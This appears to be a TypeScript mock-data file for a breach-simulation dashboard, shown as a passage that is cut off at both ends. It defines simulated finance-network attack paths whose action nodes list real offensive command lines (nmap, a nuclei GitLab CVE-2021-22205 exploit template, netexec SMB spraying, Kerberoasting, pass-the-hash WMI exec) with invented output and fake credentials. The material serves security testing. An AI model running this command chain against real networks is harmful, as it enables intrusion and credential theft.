    { node_id:'sSP-act-30', node_type:'ACTION', node_label:'nuclei scan → WS-30',
      node_status:'detected', node_payload_name:'nuclei', node_command:'nuclei',
      node_arguments:'-t technologies/ -u http://10.50.1.10', node_agent:'sentinel_one', node_agent:'sentinel_one' },
  ],
  attack_path_edges:[
    {edge_id:'sSP-al-01',edge_type:'asset_link',edge_source:'sSP-act-01',edge_target:'sSP-ep01'},
    {edge_id:'sSP-al-02',edge_type:'asset_link',edge_source:'sSP-act-02',edge_target:'sSP-ep02'},
    {edge_id:'sSP-al-03',edge_type:'asset_link',edge_source:'sSP-act-03',edge_target:'sSP-ep03'},
    {edge_id:'sSP-al-04',edge_type:'asset_link',edge_source:'sSP-act-04',edge_target:'sSP-ep04'},
    {edge_id:'sSP-al-05',edge_type:'asset_link',edge_source:'sSP-act-05',edge_target:'sSP-ep05'},
    {edge_id:'sSP-al-06',edge_type:'asset_link',edge_source:'sSP-act-06',edge_target:'sSP-ep06'},
    {edge_id:'sSP-al-07',edge_type:'asset_link',edge_source:'sSP-act-07',edge_target:'sSP-ep07'},
    {edge_id:'sSP-al-08',edge_type:'asset_link',edge_source:'sSP-act-08',edge_target:'sSP-ep08'},
    {edge_id:'sSP-al-09',edge_type:'asset_link',edge_source:'sSP-act-09',edge_target:'sSP-ep09'},
    {edge_id:'sSP-al-10',edge_type:'asset_link',edge_source:'sSP-act-10',edge_target:'sSP-ep10'},
    {edge_id:'sSP-al-11',edge_type:'asset_link',edge_source:'sSP-act-11',edge_target:'sSP-ep11'},
    {edge_id:'sSP-al-12',edge_type:'asset_link',edge_source:'sSP-act-12',edge_target:'sSP-ep12'},
    {edge_id:'sSP-al-13',edge_type:'asset_link',edge_source:'sSP-act-13',edge_target:'sSP-ep13'},
    {edge_id:'sSP-al-14',edge_type:'asset_link',edge_source:'sSP-act-14',edge_target:'sSP-ep14'},
    {edge_id:'sSP-al-15',edge_type:'asset_link',edge_source:'sSP-act-15',edge_target:'sSP-ep15'},
    {edge_id:'sSP-al-16',edge_type:'asset_link',edge_source:'sSP-act-16',edge_target:'sSP-ep16'},
    {edge_id:'sSP-al-17',edge_type:'asset_link',edge_source:'sSP-act-17',edge_target:'sSP-ep17'},
    {edge_id:'sSP-al-18',edge_type:'asset_link',edge_source:'sSP-act-18',edge_target:'sSP-ep18'},
    {edge_id:'sSP-al-19',edge_type:'asset_link',edge_source:'sSP-act-19',edge_target:'sSP-ep19'},
    {edge_id:'sSP-al-20',edge_type:'asset_link',edge_source:'sSP-act-20',edge_target:'sSP-ep20'},
    {edge_id:'sSP-al-21',edge_type:'asset_link',edge_source:'sSP-act-21',edge_target:'sSP-ep21'},
    {edge_id:'sSP-al-22',edge_type:'asset_link',edge_source:'sSP-act-22',edge_target:'sSP-ep22'},
    {edge_id:'sSP-al-23',edge_type:'asset_link',edge_source:'sSP-act-23',edge_target:'sSP-ep23'},
    {edge_id:'sSP-al-24',edge_type:'asset_link',edge_source:'sSP-act-24',edge_target:'sSP-ep24'},
    {edge_id:'sSP-al-25',edge_type:'asset_link',edge_source:'sSP-act-25',edge_target:'sSP-ep25'},
    {edge_id:'sSP-al-26',edge_type:'asset_link',edge_source:'sSP-act-26',edge_target:'sSP-ep26'},
    {edge_id:'sSP-al-27',edge_type:'asset_link',edge_source:'sSP-act-27',edge_target:'sSP-ep27'},
    {edge_id:'sSP-al-28',edge_type:'asset_link',edge_source:'sSP-act-28',edge_target:'sSP-ep28'},
    {edge_id:'sSP-al-29',edge_type:'asset_link',edge_source:'sSP-act-29',edge_target:'sSP-ep29'},
    {edge_id:'sSP-al-30',edge_type:'asset_link',edge_source:'sSP-act-30',edge_target:'sSP-ep30'},
  ],
  attack_path_stats:{
    stats_prevented:3,stats_detected:8,stats_undetected:19,
    stats_pending:0,stats_total_actions:30,stats_executed_actions:30,
    stats_captured_endpoints:15,stats_captured_files:8,stats_captured_credentials:8,
stats_captured_users: 6,
stats_captured_cves: 4,
  },
  attack_path_definitions:[
    {path_id:'sSP-p1',path_name:'Full Sweep Chain',path_color:'#9c27b0',
      node_ids:['sSP-ep01','sSP-ep02','sSP-ep03','sSP-ep04','sSP-ep05','sSP-ep06','sSP-ep07','sSP-ep08','sSP-ep09','sSP-ep10','sSP-ep11','sSP-ep12','sSP-ep13','sSP-ep14','sSP-ep15','sSP-ep16','sSP-ep17','sSP-ep18','sSP-ep19','sSP-ep20'],path_outcome:'success'},
  ],
};

// ══════════════════════════════════════════════════════════════════════════════
// NEW SCENARIO A — Finance Portal Breach (1 path, 20 eps: 7 used + 13 untouched, 2 pivots, SUCCESS)
// Real-world: APT targets financial company web portal via GitLab CVE-2021-22205 RCE.
//   nmap discovery → nuclei exploit → netexec SMB spray → 2 lateral pivots → DC compromise.
// ══════════════════════════════════════════════════════════════════════════════
export const MOCK_SCENARIO_NEW_1PATH_SUCCESS: AttackPathData = {
  attack_path_nodes: [
    // ── 7 active ASSET nodes ──────────────────────────────────────────────
    { node_id:'n1s-ep01', node_type:'ASSET', node_label:'FINANCE-WEB-01', node_hostname:'FINANCE-WEB-01',
      node_ip:'10.10.0.10', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'DMZ', node_subnet:'10.10.0.0/24', node_is_entry_point:true, node_is_pivot:true,
      node_user_privileges:'www-data (Web Service)',
      node_credentials_found:['webadmin:P@ssw0rd123','svc_app:AppSvc2024!'],
      node_agents:['palo_alto', 'sentinel_one'],
      node_accessed_files:['/var/www/html/config.php','/etc/gitlab/gitlab.rb'] },
    { node_id:'n1s-ep02', node_type:'ASSET', node_label:'FINANCE-APP-01', node_hostname:'FINANCE-APP-01',
      node_ip:'10.10.1.11', node_platform:'Windows Server 2019', node_status:'undetected',
      node_zone:'App Tier', node_subnet:'10.10.1.0/24', node_is_pivot:true,
      node_user_privileges:'CORP\svc_app (Service Account)',
      node_credentials_found:['CORP\svc_db:DbConn2024!'],
      node_agents:['palo_alto', 'sentinel_one'],
      node_accessed_files:['C:\AppServer\web.config'] },
    { node_id:'n1s-ep03', node_type:'ASSET', node_label:'FINANCE-DB-01', node_hostname:'FINANCE-DB-01',
      node_ip:'10.10.1.12', node_platform:'Windows Server 2022', node_status:'undetected',
      node_zone:'DB Tier', node_subnet:'10.10.1.0/24',
      node_user_privileges:'sa (SQL Server System Administrator)',
      node_agents:['sentinel_one', 'openaev'],
      node_credentials_found:['sa:Sql@dm1n2024'] },
    { node_id:'n1s-ep04', node_type:'ASSET', node_label:'FINANCE-DC-01', node_hostname:'FINANCE-DC-01',
      node_ip:'10.10.2.5', node_platform:'Windows Server 2022', node_status:'detected',
      node_zone:'Core', node_subnet:'10.10.2.0/24', node_is_pivot:true,
      node_user_privileges:'CORP\Administrator (Domain Admin)',
      node_agents:['sentinel_one', 'openaev'],
      node_credentials_found:['CORP\Administrator:$krbtgt$23$*svc_mssql*...','CORP\krbtgt:$HASH$AES256'] },
    { node_id:'n1s-ep05', node_type:'ASSET', node_label:'FINANCE-WS-01', node_hostname:'FINANCE-WS-01',
      node_ip:'10.10.3.20', node_platform:'Windows 11', node_status:'undetected',
      node_agents:['openaev'],
      node_zone:'Workstations', node_subnet:'10.10.3.0/24', node_user_privileges:'CORP\jsmith (User)' },
    { node_id:'n1s-ep06', node_type:'ASSET', node_label:'FINANCE-WS-02', node_hostname:'FINANCE-WS-02',
      node_ip:'10.10.3.21', node_platform:'Windows 11', node_status:'undetected',
      node_zone:'Workstations', node_subnet:'10.10.3.0/24',
      node_user_privileges:'CORP\ceo (Domain User)',
      node_agents:['sentinel_one'],
      node_accessed_files:['C:\Users\ceo\Documents\M&A_Targets_2026.xlsx'] },
    { node_id:'n1s-ep07', node_type:'ASSET', node_label:'FINANCE-ADMIN-01', node_hostname:'FINANCE-ADMIN-01',
      node_ip:'10.10.2.50', node_platform:'Windows Server 2019', node_status:'undetected',
      node_zone:'Core', node_subnet:'10.10.2.0/24',
      node_user_privileges:'CORP\Administrator (Domain Admin)',
      node_agents:['sentinel_one', 'openaev'],
      node_credentials_found:['CORP\Administrator:SuperAdm1n!2024'] },
    // ── 13 untouched ASSET nodes ──────────────────────────────────────────
    { node_id:'n1s-ep08', node_type:'ASSET', node_label:'FINANCE-DEV-01', node_hostname:'FINANCE-DEV-01', node_ip:'10.10.4.10', node_platform:'macOS Sonoma 14.4', node_status:'pending', node_zone:'Dev', node_subnet:'10.10.4.0/24', node_untouched:true, node_agents:['sentinel_one'], },
    { node_id:'n1s-ep09', node_type:'ASSET', node_label:'FINANCE-DEV-02', node_hostname:'FINANCE-DEV-02', node_ip:'10.10.4.11', node_platform:'Ubuntu 22.04 LTS', node_status:'pending', node_zone:'Dev', node_subnet:'10.10.4.0/24', node_untouched:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n1s-ep10', node_type:'ASSET', node_label:'FINANCE-DEV-03', node_hostname:'FINANCE-DEV-03', node_ip:'10.10.4.12', node_platform:'Windows 11', node_status:'pending', node_zone:'Dev', node_subnet:'10.10.4.0/24', node_untouched:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n1s-ep11', node_type:'ASSET', node_label:'FINANCE-TEST-01', node_hostname:'FINANCE-TEST-01', node_ip:'10.10.5.10', node_platform:'Ubuntu 20.04 LTS', node_status:'pending', node_zone:'Test', node_subnet:'10.10.5.0/24', node_untouched:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n1s-ep12', node_type:'ASSET', node_label:'FINANCE-TEST-02', node_hostname:'FINANCE-TEST-02', node_ip:'10.10.5.11', node_platform:'CentOS 7', node_status:'pending', node_zone:'Test', node_subnet:'10.10.5.0/24', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'n1s-ep13', node_type:'ASSET', node_label:'FINANCE-MGMT-01', node_hostname:'FINANCE-MGMT-01', node_ip:'10.10.6.10', node_platform:'Windows Server 2019', node_status:'pending', node_zone:'Management', node_subnet:'10.10.6.0/24', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'n1s-ep14', node_type:'ASSET', node_label:'FINANCE-MGMT-02', node_hostname:'FINANCE-MGMT-02', node_ip:'10.10.6.11', node_platform:'Windows Server 2022', node_status:'pending', node_zone:'Management', node_subnet:'10.10.6.0/24', node_untouched:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n1s-ep15', node_type:'ASSET', node_label:'FINANCE-MGMT-03', node_hostname:'FINANCE-MGMT-03', node_ip:'10.10.6.12', node_platform:'Red Hat 8', node_status:'pending', node_zone:'Management', node_subnet:'10.10.6.0/24', node_untouched:true, node_agents:['openaev'], },
    { node_id:'n1s-ep16', node_type:'ASSET', node_label:'FINANCE-PRINT-01', node_hostname:'FINANCE-PRINT-01', node_ip:'10.10.7.10', node_platform:'Windows 10', node_status:'pending', node_zone:'Printers', node_subnet:'10.10.7.0/24', node_untouched:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n1s-ep17', node_type:'ASSET', node_label:'FINANCE-VOIP-01', node_hostname:'FINANCE-VOIP-01', node_ip:'10.10.7.20', node_platform:'Linux (VoIP)', node_status:'pending', node_zone:'VoIP', node_subnet:'10.10.7.0/24', node_untouched:true, node_agents:['openaev'], },
    { node_id:'n1s-ep18', node_type:'ASSET', node_label:'FINANCE-NAS-01', node_hostname:'FINANCE-NAS-01', node_ip:'10.10.8.10', node_platform:'FreeNAS 13.0', node_status:'pending', node_zone:'Storage', node_subnet:'10.10.8.0/24', node_untouched:true, node_agents:['openaev'], },
    { node_id:'n1s-ep19', node_type:'ASSET', node_label:'FINANCE-KIOSK-01', node_hostname:'FINANCE-KIOSK-01', node_ip:'10.10.9.10', node_platform:'Windows 10 IoT', node_status:'pending', node_zone:'Kiosks', node_subnet:'10.10.9.0/24', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'n1s-ep20', node_type:'ASSET', node_label:'FINANCE-BACKUP-01', node_hostname:'FINANCE-BACKUP-01', node_ip:'10.10.9.20', node_platform:'Ubuntu 22.04 LTS', node_status:'pending', node_zone:'Backup', node_subnet:'10.10.9.0/24', node_untouched:true, node_agents:['sentinel_one', 'openaev'], },
    // ── 5 injector ACTION nodes ────────────────────────────────────────────
    { node_id:'n1s-act01', node_type:'ACTION', node_label:'Nmap SYN Scan — FINANCE-WEB-01',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -sV -T4 -p 22,80,443,8080,8443 10.10.0.10',
      node_executed_at:'2026-06-01T07:05:00Z', node_agent:'openaev', node_ip:'10.10.0.10',
      node_expectations:[{expectation_id:'n1s-e01',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for FINANCE-WEB-01 (10.10.0.10)
Host is up (0.0024s latency).
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 8.9p1
80/tcp   open  http      nginx 1.24.0
443/tcp  open  ssl/https nginx 1.24.0
8080/tcp open  http      GitLab 14.9.0
8443/tcp closed https-alt
Nmap done: 1 IP address (1 host up) scanned in 8.44s` },
    { node_id:'n1s-act02', node_type:'ACTION', node_label:'Nuclei CVE-2021-22205 — FINANCE-WEB-01',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2021-22205',
      node_command:'nuclei', node_arguments:'-u http://10.10.0.10:8080 -t cves/2021/CVE-2021-22205.yaml',
      node_executed_at:'2026-06-01T07:12:00Z', node_agent:'sentinel_one', node_ip:'10.10.0.10',
      node_credentials_found:['webadmin:P@ssw0rd123','svc_app:AppSvc2024!'],
      node_accessed_files:['/var/www/html/config.php','/etc/gitlab/gitlab.rb'],
      node_expectations:[{expectation_id:'n1s-e02',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[INF] nuclei - Fast and customisable vulnerability scanner
[2026-06-01 07:12:01] [CVE-2021-22205] [http] [critical] http://10.10.0.10:8080
[+] GitLab ExifTool image upload RCE (unauthenticated)
[+] Command executed: id → uid=998(git) gid=998(git)
[+] Credentials extracted from /etc/gitlab/gitlab.rb:
    webadmin:P@ssw0rd123
    svc_app:AppSvc2024!` },
    { node_id:'n1s-act03', node_type:'ACTION', node_label:'NetExec SMB Spray — FINANCE-APP-01',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.10.1.11 -u svc_app -p AppSvc2024! --shares',
      node_executed_at:'2026-06-01T07:28:00Z', node_agent:'sentinel_one', node_ip:'10.10.1.11',
      node_credentials_found:['CORP\svc_db:DbConn2024!'],
      node_accessed_files:['C:\AppServer\web.config','C:\AppServer\appsettings.json'],
      node_expectations:[{expectation_id:'n1s-e03',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.10.1.11  445  FINANCE-APP-01  [*] Windows Server 2019 x64
SMB    10.10.1.11  445  FINANCE-APP-01  [+] CORP\svc_app:AppSvc2024! (Pwn3d!)
SMB    10.10.1.11  445  FINANCE-APP-01  [+] Dumping SAM hashes
SMB    10.10.1.11  445  FINANCE-APP-01  [+] web.config: CORP\svc_db:DbConn2024!` },
    { node_id:'n1s-act04', node_type:'ACTION', node_label:'NetExec LDAP Kerberoasting — FINANCE-DC-01',
      node_status:'detected', node_payload_name:'netexec – LDAP Kerberoasting',
      node_command:'netexec', node_arguments:'ldap 10.10.2.5 -u Administrator -p "SuperAdm1n!2024" --kerberoasting',
      node_executed_at:'2026-06-01T07:55:00Z', node_agent:'sentinel_one', node_ip:'10.10.2.5',
      node_credentials_found:['CORP\Administrator:$krbtgt$23$*svc_mssql*CORP.LOCAL*...','CORP\krbtgt:$HASH$AES256'],
      node_expectations:[{expectation_id:'n1s-e04',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`LDAP   10.10.2.5   389  FINANCE-DC-01   [*] Windows Server 2022 x64
LDAP   10.10.2.5   389  FINANCE-DC-01   [+] CORP\Administrator:SuperAdm1n!2024 (Pwn3d!)
LDAP   10.10.2.5   389  FINANCE-DC-01   [+] sAMAccountName: svc_mssql
LDAP   10.10.2.5   389  FINANCE-DC-01   $krbtgs$23$*svc_mssql*CORP.LOCAL*HTTP/db-01*...
LDAP   10.10.2.5   389  FINANCE-DC-01   [+] DCSync: krbtgt hash extracted
[!] DETECTION ALERT: Kerberoasting flagged by SIEM (rule: suspicious-ldap-bulk-query)` },
    { node_id:'n1s-act05', node_type:'ACTION', node_label:'NetExec WMI Exec — FINANCE-ADMIN-01',
      node_status:'undetected', node_payload_name:'netexec – WMI exec',
      node_command:'netexec', node_arguments:'wmi 10.10.2.50 -u Administrator -H $NTHASH -x "whoami /all"',
      node_executed_at:'2026-06-01T08:15:00Z', node_agent:'sentinel_one', node_ip:'10.10.2.50',
      node_credentials_found:['CORP\Administrator:SuperAdm1n!2024'],
      node_accessed_files:['C:\Windows\NTDS\ntds.dit','C:\Scripts\backup_creds.ps1'],
      node_expectations:[{expectation_id:'n1s-e05',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`WMI    10.10.2.50  445  FINANCE-ADMIN-01  [*] Windows Server 2019 x64
WMI    10.10.2.50  445  FINANCE-ADMIN-01  [+] CORP\Administrator (Pwn3d!)
WMI    10.10.2.50  445  FINANCE-ADMIN-01  NT AUTHORITY\SYSTEM
WMI    10.10.2.50  445  FINANCE-ADMIN-01  [+] backup_creds.ps1 with plaintext creds found` },
  ],
  attack_path_edges: [
    { edge_id:'n1s-al-01', edge_type:'asset_link', edge_source:'n1s-act01', edge_target:'n1s-ep01' },
    { edge_id:'n1s-al-02', edge_type:'asset_link', edge_source:'n1s-act02', edge_target:'n1s-ep01' },
    { edge_id:'n1s-al-03', edge_type:'asset_link', edge_source:'n1s-act03', edge_target:'n1s-ep02' },
    { edge_id:'n1s-al-04', edge_type:'asset_link', edge_source:'n1s-act04', edge_target:'n1s-ep04' },
    { edge_id:'n1s-al-05', edge_type:'asset_link', edge_source:'n1s-act05', edge_target:'n1s-ep07' },
    { edge_id:'n1s-pivot-02-03', edge_type:'pivot', edge_source:'n1s-ep02', edge_target:'n1s-ep03', edge_label:'DB config password reuse (SQL SA)' },
    { edge_id:'n1s-pivot-04-06', edge_type:'pivot', edge_source:'n1s-ep04', edge_target:'n1s-ep06', edge_label:'Golden Ticket lateral movement to CEO workstation' },
  ],
  attack_path_stats: {
    stats_prevented:0, stats_detected:1, stats_undetected:4,
    stats_pending:13, stats_total_actions:5, stats_executed_actions:5,
    stats_captured_endpoints:7, stats_captured_files:8, stats_captured_credentials:7,
 stats_captured_users: 5,
 stats_captured_cves: 3,
  },
  attack_path_definitions: [
    { path_id:'n1s-p1', path_name:'Finance Portal Breach Chain', path_color:'#f44336',
      node_ids:['n1s-ep01','n1s-ep02','n1s-ep03','n1s-ep04','n1s-ep05','n1s-ep06','n1s-ep07'],
      path_outcome:'success',
      path_segment_reasons:{
        'n1s-ep01->n1s-ep02':'Credential reuse (svc_app from nuclei exploit)',
        'n1s-ep02->n1s-ep03':'DB config password reuse (SQL SA pivot)',
        'n1s-ep03->n1s-ep04':'Service account privilege escalation to DC',
        'n1s-ep04->n1s-ep05':'Pass-the-Hash via WMI',
        'n1s-ep04->n1s-ep06':'Golden Ticket lateral movement',
        'n1s-ep06->n1s-ep07':'Domain Admin from Golden Ticket',
      },
    },
  ],
};


// ══════════════════════════════════════════════════════════════════════════════
// NEW SCENARIO B — Finance Portal Breach (same topology, FAILED — blocked by EDR + Credential Guard)
// Same 20 endpoints, same 7 active, same attack chain — but security controls blocked the pivot.
// ══════════════════════════════════════════════════════════════════════════════
export const MOCK_SCENARIO_NEW_1PATH_FAILED: AttackPathData = {
  attack_path_nodes: [
    // ── 7 active ASSET nodes ──────────────────────────────────────────────
    { node_id:'n1f-ep01', node_type:'ASSET', node_label:'FINANCE-WEB-01', node_hostname:'FINANCE-WEB-01',
      node_ip:'10.10.0.10', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'DMZ', node_subnet:'10.10.0.0/24', node_is_entry_point:true, node_is_pivot:true,
      node_user_privileges:'www-data (Web Service)',
      node_agents:['palo_alto', 'sentinel_one', 'openaev'],
      node_credentials_found:['webadmin:P@ssw0rd123'] },
    { node_id:'n1f-ep02', node_type:'ASSET', node_label:'FINANCE-APP-01', node_hostname:'FINANCE-APP-01',
      node_ip:'10.10.1.11', node_platform:'Windows Server 2019', node_status:'detected',
      node_zone:'App Tier', node_subnet:'10.10.1.0/24',
      node_agents:['palo_alto'],
      node_user_privileges:'CORP\svc_app (Service Account)' },
    { node_id:'n1f-ep03', node_type:'ASSET', node_label:'FINANCE-DB-01', node_hostname:'FINANCE-DB-01',
      node_ip:'10.10.1.12', node_platform:'Windows Server 2022', node_status:'pending',
      node_agents:['palo_alto'],
      node_zone:'DB Tier', node_subnet:'10.10.1.0/24' },
    { node_id:'n1f-ep04', node_type:'ASSET', node_label:'FINANCE-DC-01', node_hostname:'FINANCE-DC-01',
      node_ip:'10.10.2.5', node_platform:'Windows Server 2022', node_status:'prevented',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Core', node_subnet:'10.10.2.0/24' },
    { node_id:'n1f-ep05', node_type:'ASSET', node_label:'FINANCE-WS-01', node_hostname:'FINANCE-WS-01',
      node_ip:'10.10.3.20', node_platform:'Windows 11', node_status:'pending',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Workstations', node_subnet:'10.10.3.0/24' },
    { node_id:'n1f-ep06', node_type:'ASSET', node_label:'FINANCE-WS-02', node_hostname:'FINANCE-WS-02',
      node_ip:'10.10.3.21', node_platform:'Windows 11', node_status:'pending',
      node_agents:['palo_alto'],
      node_zone:'Workstations', node_subnet:'10.10.3.0/24' },
    { node_id:'n1f-ep07', node_type:'ASSET', node_label:'FINANCE-ADMIN-01', node_hostname:'FINANCE-ADMIN-01',
      node_ip:'10.10.2.50', node_platform:'Windows Server 2019', node_status:'pending',
      node_agents:['openaev'],
      node_zone:'Core', node_subnet:'10.10.2.0/24' },
    // ── 13 untouched ASSET nodes ──────────────────────────────────────────
    { node_id:'n1f-ep08', node_type:'ASSET', node_label:'FINANCE-DEV-01', node_hostname:'FINANCE-DEV-01', node_ip:'10.10.4.10', node_platform:'macOS Sonoma 14.4', node_status:'pending', node_zone:'Dev', node_subnet:'10.10.4.0/24', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'n1f-ep09', node_type:'ASSET', node_label:'FINANCE-DEV-02', node_hostname:'FINANCE-DEV-02', node_ip:'10.10.4.11', node_platform:'Ubuntu 22.04 LTS', node_status:'pending', node_zone:'Dev', node_subnet:'10.10.4.0/24', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'n1f-ep10', node_type:'ASSET', node_label:'FINANCE-DEV-03', node_hostname:'FINANCE-DEV-03', node_ip:'10.10.4.12', node_platform:'Windows 11', node_status:'pending', node_zone:'Dev', node_subnet:'10.10.4.0/24', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'n1f-ep11', node_type:'ASSET', node_label:'FINANCE-TEST-01', node_hostname:'FINANCE-TEST-01', node_ip:'10.10.5.10', node_platform:'Ubuntu 20.04 LTS', node_status:'pending', node_zone:'Test', node_subnet:'10.10.5.0/24', node_untouched:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n1f-ep12', node_type:'ASSET', node_label:'FINANCE-TEST-02', node_hostname:'FINANCE-TEST-02', node_ip:'10.10.5.11', node_platform:'CentOS 7', node_status:'pending', node_zone:'Test', node_subnet:'10.10.5.0/24', node_untouched:true, node_agents:['openaev'], },
    { node_id:'n1f-ep13', node_type:'ASSET', node_label:'FINANCE-MGMT-01', node_hostname:'FINANCE-MGMT-01', node_ip:'10.10.6.10', node_platform:'Windows Server 2019', node_status:'pending', node_zone:'Management', node_subnet:'10.10.6.0/24', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'n1f-ep14', node_type:'ASSET', node_label:'FINANCE-MGMT-02', node_hostname:'FINANCE-MGMT-02', node_ip:'10.10.6.11', node_platform:'Windows Server 2022', node_status:'pending', node_zone:'Management', node_subnet:'10.10.6.0/24', node_untouched:true, node_agents:['sentinel_one'], },
    { node_id:'n1f-ep15', node_type:'ASSET', node_label:'FINANCE-MGMT-03', node_hostname:'FINANCE-MGMT-03', node_ip:'10.10.6.12', node_platform:'Red Hat 8', node_status:'pending', node_zone:'Management', node_subnet:'10.10.6.0/24', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'n1f-ep16', node_type:'ASSET', node_label:'FINANCE-PRINT-01', node_hostname:'FINANCE-PRINT-01', node_ip:'10.10.7.10', node_platform:'Windows 10', node_status:'pending', node_zone:'Printers', node_subnet:'10.10.7.0/24', node_untouched:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n1f-ep17', node_type:'ASSET', node_label:'FINANCE-VOIP-01', node_hostname:'FINANCE-VOIP-01', node_ip:'10.10.7.20', node_platform:'Linux (VoIP)', node_status:'pending', node_zone:'VoIP', node_subnet:'10.10.7.0/24', node_untouched:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n1f-ep18', node_type:'ASSET', node_label:'FINANCE-NAS-01', node_hostname:'FINANCE-NAS-01', node_ip:'10.10.8.10', node_platform:'FreeNAS 13.0', node_status:'pending', node_zone:'Storage', node_subnet:'10.10.8.0/24', node_untouched:true, node_agents:['openaev'], },
    { node_id:'n1f-ep19', node_type:'ASSET', node_label:'FINANCE-KIOSK-01', node_hostname:'FINANCE-KIOSK-01', node_ip:'10.10.9.10', node_platform:'Windows 10 IoT', node_status:'pending', node_zone:'Kiosks', node_subnet:'10.10.9.0/24', node_untouched:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n1f-ep20', node_type:'ASSET', node_label:'FINANCE-BACKUP-01', node_hostname:'FINANCE-BACKUP-01', node_ip:'10.10.9.20', node_platform:'Ubuntu 22.04 LTS', node_status:'pending', node_zone:'Backup', node_subnet:'10.10.9.0/24', node_untouched:true, node_agents:['openaev'], },
    // ── 5 injector ACTION nodes ────────────────────────────────────────────
    { node_id:'n1f-act01', node_type:'ACTION', node_label:'Nmap SYN Scan — FINANCE-WEB-01',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -sV -T4 -p 22,80,443,8080 10.10.0.10',
      node_executed_at:'2026-06-08T07:05:00Z', node_agent:'openaev', node_ip:'10.10.0.10',
      node_expectations:[{expectation_id:'n1f-e01',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Starting Nmap 7.95
Nmap scan report for FINANCE-WEB-01 (10.10.0.10) — 22/tcp ssh, 80/tcp http nginx, 8080/tcp GitLab 14.9
Nmap done: 1 IP (1 host up) in 7.22s` },
    { node_id:'n1f-act02', node_type:'ACTION', node_label:'Nuclei CVE-2021-22205 — FINANCE-WEB-01',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2021-22205',
      node_command:'nuclei', node_arguments:'-u http://10.10.0.10:8080 -t cves/2021/CVE-2021-22205.yaml',
      node_executed_at:'2026-06-08T07:12:00Z', node_agent:'sentinel_one', node_ip:'10.10.0.10',
      node_credentials_found:['webadmin:P@ssw0rd123'],
      node_accessed_files:['/var/www/html/config.php'],
      node_expectations:[{expectation_id:'n1f-e02',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2021-22205] [critical] http://10.10.0.10:8080
[+] GitLab RCE via ExifTool — initial foothold obtained
[+] webadmin:P@ssw0rd123 extracted from config` },
    { node_id:'n1f-act03', node_type:'ACTION', node_label:'NetExec SMB Spray — FINANCE-APP-01',
      node_status:'detected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.10.1.11 -u svc_app -p AppSvc2024! --shares',
      node_executed_at:'2026-06-08T07:28:00Z', node_agent:'sentinel_one', node_ip:'10.10.1.11',
      node_expectations:[{expectation_id:'n1f-e03',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`SMB    10.10.1.11  445  FINANCE-APP-01  [+] CORP\svc_app:AppSvc2024! (Pwn3d!)
[!] DETECTION: CrowdStrike Falcon EDR flagged credential dumping on FINANCE-APP-01
[!] ALERT: Lateral movement attempt quarantined — process terminated` },
    { node_id:'n1f-act04', node_type:'ACTION', node_label:'NetExec LDAP Kerberoasting — FINANCE-DC-01',
      node_status:'prevented', node_payload_name:'netexec – LDAP Kerberoasting',
      node_command:'netexec', node_arguments:'ldap 10.10.2.5 -u Administrator -p "SuperAdm1n!2024" --kerberoasting',
      node_executed_at:'2026-06-08T07:55:00Z', node_agent:'sentinel_one', node_ip:'10.10.2.5',
      node_expectations:[{expectation_id:'n1f-e04',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`LDAP   10.10.2.5   389  FINANCE-DC-01   [*] Windows Server 2022 x64
[!] PREVENTION: Windows Defender Credential Guard blocked LSASS access
[!] PREVENTION: Kerberoasting blocked by Microsoft Entra ID Protection
[-] DCSync FAILED — Protected Users security group enforced` },
    { node_id:'n1f-act05', node_type:'ACTION', node_label:'NetExec WMI Exec — FINANCE-ADMIN-01',
      node_status:'prevented', node_payload_name:'netexec – WMI exec',
      node_command:'netexec', node_arguments:'wmi 10.10.2.50 -u Administrator -H $NTHASH -x "whoami"',
